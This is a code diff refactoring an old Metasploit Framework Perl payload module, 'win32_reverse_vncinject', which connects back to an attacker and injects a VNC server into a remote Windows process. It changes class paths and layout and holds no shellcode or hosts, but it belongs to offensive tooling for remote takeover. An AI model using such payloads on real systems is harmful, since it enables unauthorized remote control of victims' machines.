@@ -9,29 +9,35 @@
 
 package Msf::Payload::win32_reverse_vncinject;
 use strict;
-use base 'Msf::PayloadComponent::Win32InjectVncStage';
+use base 'Msf::PayloadComponent::Windows::ia32::InjectVncStage';
 use FindBin qw{$RealBin};
-
-sub _Load {
-  Msf::PayloadComponent::Win32InjectVncStage->_Import('Msf::PayloadComponent::Win32ReverseStager');
-  __PACKAGE__->SUPER::_Load();
-}
 
 my $info =
 {
-  'Name'         => 'Windows Reverse VNC Server DLL Inject',
-  'Version'      => '$Revision$',
-  'Description'  => 'Connect back and inject a VNC server into the remote process',
-                
+	'Name'         => 'Windows Reverse VNC Server DLL Inject',
+	'Version'      => '$Revision$',
+	'Description'  => 'Connect back and inject a VNC server into the remote process',
 };
 
-sub new {
-  _Load();
-  my $class = shift;
-  my $hash = @_ ? shift : { };
-  $hash = $class->MergeHashRec($hash, {'Info' => $info});
-  my $self = $class->SUPER::new($hash, @_);
-  return($self);
+sub _Load 
+{
+	Msf::PayloadComponent::Windows::ia32::InjectVncStage->_Import('Msf::PayloadComponent::Windows::ia32::ReverseStager');
+
+	__PACKAGE__->SUPER::_Load();
+}
+
+sub new 
+{
+	my $class = shift;
+	my $hash = @_ ? shift : { };
+	my $self;
+
+	_Load();
+
+	$hash = $class->MergeHashRec($hash, {'Info' => $info});
+	$self = $class->SUPER::new($hash, @_);
+
+	return($self);
 }
 
 1;
